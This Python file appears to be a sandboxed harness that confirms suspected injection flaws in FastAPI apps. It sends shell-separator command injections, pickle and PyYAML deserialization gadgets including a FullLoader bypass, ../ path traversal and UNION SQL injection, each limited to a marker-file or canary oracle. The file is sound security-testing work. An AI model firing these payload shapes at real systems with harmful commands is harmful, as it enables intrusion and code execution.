"""Runtime validation harness - runs INSIDE the sandbox container.

Self-contained on purpose (stdlib + the target's own FastAPI install): it is
copied into the container next to the target sources and started as

    python -I harness.py PLAN.json WORK_ROOT

For every case in the plan a fresh child process imports the target app,
drives the route in-process with FastAPI's TestClient (no sockets, so the
container needs no network) and tries a short, fixed list of payload
variants for the case's sink type. Payloads are non-destructive markers:

- command_execution / dynamic_evaluation / unsafe_deserialization: the
  injected code only creates an empty marker file in the case's own
  scratch directory; the oracle is "does that file exist".
- path_traversal: the harness plants a canary file and asks the route to
  read it by absolute and by `../` path; the oracle is "is the canary's
  random content in the response" (the content never appears in the
  request, so reflection can't fake it).
- sql_injection: UNION-based payloads whose marker is built by SQL string
  concatenation ('SECT' || 'ESTGEN...'); the oracle is the concatenated
  marker in the response, which only appears if the database evaluated
  the injected SQL.

The result for each case is printed as one `SECTESTGEN_RESULT <json>` line.
"""

from __future__ import annotations

import base64
import importlib
import json
import os
import pickle
import re
import subprocess
import sys
import tempfile
import traceback
from pathlib import Path
from urllib.parse import quote

RESULT_PREFIX = "SECTESTGEN_RESULT "
_PATH_PARAM_RE = re.compile(r"{([^:}]+)(?::([^}]+))?}")
_BENIGN = "1"
_MAX_BODY = 2000


class _Exec:
    """Pickles as a reference to builtins.exec + a code string, so unpickling
    needs nothing from this harness."""

    def __init__(self, code: str) -> None:
        self.code = code

    def __reduce__(self):
        return (exec, (self.code,))


# --- payload variants ---------------------------------------------------------
# Each variant: (label, value, oracle). `value` is a str sent as-is.


def _marker_variants(case: dict, scratch: Path) -> list[tuple[str, str, object]]:
    marker = f"sectestgen_{case['nonce']}"
    created = lambda _response: (scratch / marker).exists()  # noqa: E731
    touch_py = f"__import__('pathlib').Path('{marker}').touch()"
    sink = case["sink_type"]

    if sink == "command_execution":
        shell = [
            ("semicolon", f"127.0.0.1;touch {marker};#"),
            ("pipe", f"127.0.0.1|touch {marker}"),
            ("and", f"127.0.0.1&&touch {marker}"),
            ("subshell", f"$(touch {marker})"),
            ("backtick", f"`touch {marker}`"),
            ("newline", f"127.0.0.1\ntouch {marker}"),
        ]
        return [(label, value, created) for label, value in shell]

    if sink == "dynamic_evaluation":
        return [
            ("expression", touch_py, created),
            ("statement", f"import pathlib; pathlib.Path('{marker}').touch()", created),
        ]

    if sink == "unsafe_deserialization":
        blob = pickle.dumps(_Exec(f"import pathlib; pathlib.Path('{marker}').touch()"), protocol=2)
        return [
            ("pickle-base64", base64.b64encode(blob).decode(), created),
            ("pickle-base64url", base64.urlsafe_b64encode(blob).decode(), created),
            ("pickle-hex", blob.hex(), created),
            ("yaml-apply", f'!!python/object/apply:exec ["{touch_py}"]', created),
            # FullLoader bypass shape (CVE-2020-14343 class), marker-only.
            ("yaml-new-map-eval",
             f'!!python/object/new:tuple [!!python/object/new:map [!!python/name:eval , ["{touch_py}"]]]',
             created),
        ]
    return []


def _traversal_variants(case: dict, scratch: Path) -> list[tuple[str, str, object]]:
    canary_dir = scratch / "canary"
    canary_dir.mkdir(exist_ok=True)
    canary = canary_dir / f"{case['nonce']}.txt"
    token = f"SECTESTGEN-CANARY-{os.urandom(8).hex()}"
    canary.write_text(token, encoding="utf-8")
    found = lambda response: token in response.text  # noqa: E731
    absolute = canary.resolve().as_posix()
    return [
        ("absolute", absolute, found),
        ("dotdot", "../" * 16 + absolute.lstrip("/"), found),
    ]


def _sqli_variants(case: dict, scratch: Path) -> list[tuple[str, str, object]]:
    token = f"SECTESTGEN{case['nonce']}"
    found = lambda response: token in response.text  # noqa: E731
    pipe = f"'SECT'||'ESTGEN{case['nonce']}'"
    concat = f"CONCAT('SECT','ESTGEN{case['nonce']}')"
    variants = []
    for expr, label in ((pipe, "pipes"), (concat, "concat")):
        for columns in range(1, 7):
            select = ",".join([expr] * columns)
            variants.append((f"string-{label}-{columns}", f"x' UNION SELECT {select}-- ", found))
            variants.append((f"numeric-{label}-{columns}", f"0 UNION SELECT {select}-- ", found))
    return variants


_VARIANT_BUILDERS = {
    "command_execution": _marker_variants,
    "dynamic_evaluation": _marker_variants,
    "unsafe_deserialization": _marker_variants,
    "path_traversal": _traversal_variants,
    "sql_injection": _sqli_variants,
}

_EXPECTED = {
    "command_execution": "injected shell command creates marker file {marker}",
    "dynamic_evaluation": "evaluated input creates marker file {marker}",
    "unsafe_deserialization": "deserialized object creates marker file {marker}",
    "path_traversal": "response contains the content of a canary file outside the app",
    "sql_injection": "response contains a marker produced by SQL string concatenation",
}


# --- request building ---------------------------------------------------------


def _is_target(source: dict, target: dict) -> bool:
    return (source["kind"], source["name"], source.get("field")) == (
        target["kind"], target["name"], target.get("field"),
    )


def build_request(case: dict, value: str) -> dict:
    target = case["target"]
    sources = case["sources"]

    def fill(match: re.Match) -> str:
        name, converter = match.group(1), match.group(2)
        param = value if (target["kind"], target["name"]) == ("path", name) else _BENIGN
        return quote(param, safe="/" if converter == "path" else "")

    request = {
        "method": case["method"],
        "url": _PATH_PARAM_RE.sub(fill, case["path"]),
        "params": {},
        "headers": {},
        "cookies": {},
        "json": None,
    }
    body_sources = [s for s in sources if s["kind"] == "body"]
    body: dict = {}
    for source in sources:
        current = value if _is_target(source, target) else _BENIGN
        kind = source["kind"]
        if kind == "query":
            request["params"][source["name"]] = current
        elif kind == "header":
            request["headers"][source["name"].replace("_", "-")] = current
        elif kind == "cookie":
            request["cookies"][source["name"]] = current
        elif kind == "body":
            if source.get("field"):
                body.setdefault(source["name"], {})[source["field"]] = current
            else:
                body[source["name"]] = current
    if body_sources:
        names = {s["name"] for s in body_sources}
        if len(names) == 1:
            # A single body parameter is not embedded under its name by FastAPI.
            request["json"] = body[next(iter(names))]
        else:
            request["json"] = body
    return request


def _send(client, request: dict):
    headers = dict(request["headers"])
    if request["cookies"]:
        headers["Cookie"] = "; ".join(f"{k}={v}" for k, v in request["cookies"].items())
    kwargs = {"params": request["params"] or None, "headers": headers or None}
    if request["json"] is not None:
        kwargs["json"] = request["json"]
    return client.request(request["method"], request["url"], **kwargs)


# --- app loading --------------------------------------------------------------


def load_app(module_file: Path, work_root: Path):
    module_file = module_file.resolve()
    work_root = work_root.resolve()
    package_dir = module_file.parent
    parts = [module_file.stem]
    while (package_dir / "__init__.py").exists() and package_dir != work_root:
        parts.insert(0, package_dir.name)
        package_dir = package_dir.parent
    sys.path.insert(0, str(package_dir))
    module = importlib.import_module(".".join(parts))

    from fastapi import FastAPI

    for value in vars(module).values():
        if isinstance(value, FastAPI):
            return value
    raise LookupError(f"no FastAPI application object found in {module_file.name}")


# --- case execution -----------------------------------------------------------


def run_case(case: dict, work_root: Path, scratch: Path) -> dict:
    """Runs in its own process with cwd = scratch."""
    result = {
        "id": case["id"],
        "observed": None,
        "expected": _EXPECTED.get(case["sink_type"], "").format(marker=f"sectestgen_{case['nonce']}"),
        "attempts": [],
        "error": None,
    }
    builder = _VARIANT_BUILDERS.get(case["sink_type"])
    if builder is None:
        result["error"] = f"no validator for sink type {case['sink_type']!r}"
        return result
    try:
        app = load_app(work_root / case["module_file"], work_root)
        from fastapi.testclient import TestClient
    except Exception as exc:  # noqa: BLE001 - reported as evidence, not raised
        result["error"] = f"could not load app: {type(exc).__name__}: {exc}"
        return result

    variants = builder(case, scratch)
    with TestClient(app, raise_server_exceptions=False) as client:
        for label, value, oracle in variants:
            request = build_request(case, value)
            try:
                response = _send(client, request)
                observed = bool(oracle(response))
                attempt = {
                    "variant": label,
                    "request": request,
                    "status": response.status_code,
                    "response": response.text[:_MAX_BODY],
                    "observed": observed,
                }
            except Exception as exc:  # noqa: BLE001
                observed = False
                attempt = {"variant": label, "request": request, "error": f"{type(exc).__name__}: {exc}",
                           "observed": False}
            result["attempts"].append(attempt)
            if observed:
                result["observed"] = True
                return result
    result["observed"] = False
    return result


def run_plan(plan: dict, work_root: Path, case_timeout: int) -> list[dict]:
    results = []
    for case in plan["cases"]:
        scratch = Path(tempfile.mkdtemp(prefix=f"case-{case['nonce']}-"))
        try:
            proc = subprocess.run(
                [sys.executable, "-I", os.path.abspath(__file__), "--case", json.dumps(case), str(work_root)],
                cwd=scratch,
                capture_output=True,
                text=True,
                timeout=case_timeout,
            )
            line = next((l for l in proc.stdout.splitlines() if l.startswith(RESULT_PREFIX)), None)
            if line is None:
                result = {"id": case["id"], "observed": None, "attempts": [],
                          "error": f"case process exited {proc.returncode} without a result"}
            else:
                result = json.loads(line[len(RESULT_PREFIX):])
            result["logs"] = (proc.stdout.replace(line or "", "") + proc.stderr)[-_MAX_BODY:]
        except subprocess.TimeoutExpired:
            result = {"id": case["id"], "observed": None, "attempts": [],
                      "error": f"case timed out after {case_timeout} s", "logs": ""}
        results.append(result)
    return results


def main(argv: list[str]) -> int:
    if argv[:1] == ["--case"]:
        case, work_root = json.loads(argv[1]), Path(argv[2])
        try:
            result = run_case(case, work_root, Path.cwd())
        except Exception:  # noqa: BLE001
            result = {"id": case["id"], "observed": None, "attempts": [], "error": traceback.format_exc()[-1500:]}
        print(RESULT_PREFIX + json.dumps(result), flush=True)
        return 0

    plan = json.loads(Path(argv[0]).read_text(encoding="utf-8"))
    for result in run_plan(plan, Path(argv[1]), int(plan.get("case_timeout", 20))):
        print(RESULT_PREFIX + json.dumps(result), flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
